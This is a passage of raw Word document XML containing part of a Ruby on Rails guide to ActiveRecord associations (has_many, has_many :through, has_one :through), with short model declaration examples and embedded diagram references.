        <w:gridCol w:w="4344"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="3C4EAA81" w14:textId="77777777" w:rsidTr="00D543E0">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="36BEFDC9" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Supplier &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="581AEB86" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_one :account</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1BCA55EA" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="30EFEF0E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="380F6CF5" wp14:editId="42D3D649">
            <wp:extent cx="5962650" cy="3000375"/>
            <wp:effectExtent l="19050" t="0" r="0" b="0"/>
            <wp:docPr id="12" name="图片 12" descr="has_one Associ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s_one Association Diagram"/>
                    <pic:cNvPicPr>
                      <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
                    </pic:cNvPicPr>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId207" cstate="print"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5962650" cy="3000375"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln w="9525">
                      <a:noFill/>
                      <a:miter lim="800000"/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FB2BDE7" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.3 The </w:t>
      </w:r>
      <w:r w:rsidRPr="004A5FA5">
        <w:rPr>
          <w:rStyle w:val="HTML"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>has_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Association</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="072C549C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">A </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association indicates a one-to-many connection with another model. You’ll often find this association on the “other side” of a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>belongs_to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association. This association indicates that each instance of the model has zero or more instances of another model. For example, in an application containing customers and orders, the customer model could be declared like this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4344"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="53DB96A1" w14:textId="77777777" w:rsidTr="000C71F7">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4AB6AABB" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Customer &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5CC09B67" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :orders</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6416A598" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2A2E733C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The name of the other model is pluralized when declaring a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="530788FB" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="53D07BD8" wp14:editId="002BF8B2">
            <wp:extent cx="6038850" cy="3000375"/>
            <wp:effectExtent l="19050" t="0" r="0" b="0"/>
            <wp:docPr id="13" name="图片 13" descr="has_many Associ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s_many Association Diagram"/>
                    <pic:cNvPicPr>
                      <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
                    </pic:cNvPicPr>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId208" cstate="print"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6038850" cy="3000375"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln w="9525">
                      <a:noFill/>
                      <a:miter lim="800000"/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="631EEA43" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.4 The </w:t>
      </w:r>
      <w:r w:rsidRPr="004A5FA5">
        <w:rPr>
          <w:rStyle w:val="HTML"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>has_many :through</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Association</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="340DE774" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">A </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_many :through</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association is often used to set up a many-to-many connection with another model. This association indicates that the declaring model can be matched with zero or more instances of another model by proceeding </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>through</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> a third model. For example, consider a medical practice where patients make appointments to see physicians. The relevant association declarations could look like this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6264"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="473DA260" w14:textId="77777777" w:rsidTr="000C71F7">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="14752230" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Physician &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6CAD4521" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :appointments</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4E41FDF2" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :patients, :through</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :appointments</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="54B80999" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="335526DF" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="64C10F41" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Appointment &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5D730D13" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :physician</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="21C9714A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :patient</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="480BE020" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0AA206F7" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="04F1F552" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Patient &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="515CF81F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :appointments</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="76A792FA" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :physicians, :through</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :appointments</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="15BE793C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="228B23D4" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="31F0755E" wp14:editId="70D37389">
            <wp:extent cx="6257925" cy="7410450"/>
            <wp:effectExtent l="19050" t="0" r="9525" b="0"/>
            <wp:docPr id="14" name="图片 14" descr="has_many :through Associ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s_many :through Association Diagram"/>
                    <pic:cNvPicPr>
                      <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
                    </pic:cNvPicPr>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId209" cstate="print"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6257925" cy="7410450"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln w="9525">
                      <a:noFill/>
                      <a:miter lim="800000"/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EEA4585" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The collection of join models can be managed via the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>API</w:t>
      </w:r>
      <w:r>
        <w:t>. For example, if you assign</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3480"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="3AA378A9" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0C79E06D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82">
            <w:pPr>
              <w:divId w:val="936521495"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>physician.patients = patients</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2C58B4AD" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>new join models are created for newly associated objects, and if some are gone their rows are deleted.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62181D0C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Automatic deletion of join models is direct, no destroy callbacks are triggered.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="521F4B25" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_many :through</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association is also useful for setting up “shortcuts” through nested </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> associations. For example, if a document has many sections, and a section has many paragraphs, you may sometimes want to get a simple collection of all paragraphs in the document. You could set that up this way:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5784"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="0FF8D002" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1592B8F7" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Document &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="38CE8C23" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :sections</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="66E2DB3A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :paragraphs, :through</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :sections</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="280128F9" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4F8D9752" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="05F30DD8" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Section &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5866BDE8" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :document</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="78904E16" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :paragraphs</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="531095E8" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3E53BF1F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2DD7D9EF" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Paragraph &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4CD07F37" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :section</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="75AD2F34" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5750A8C7" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">With </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:through =&gt; :sections</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> specified, Rails will now understand:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2616"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="438FD5D7" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4C67C225" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82">
            <w:pPr>
              <w:divId w:val="1132554420"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@document.paragraphs</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="000B6F21" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.5 The </w:t>
      </w:r>
      <w:r w:rsidRPr="008B367F">
        <w:rPr>
          <w:rStyle w:val="HTML"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>has_one :through</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Association</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51B2E62E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">A </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_one :through</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association sets up a one-to-one connection with another model. This association indicates that the declaring model can be matched with one instance of another model by proceeding </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>through</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> a third model. For example, if each supplier has one account, and each account is associated with one account history, then the customer model could look like this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
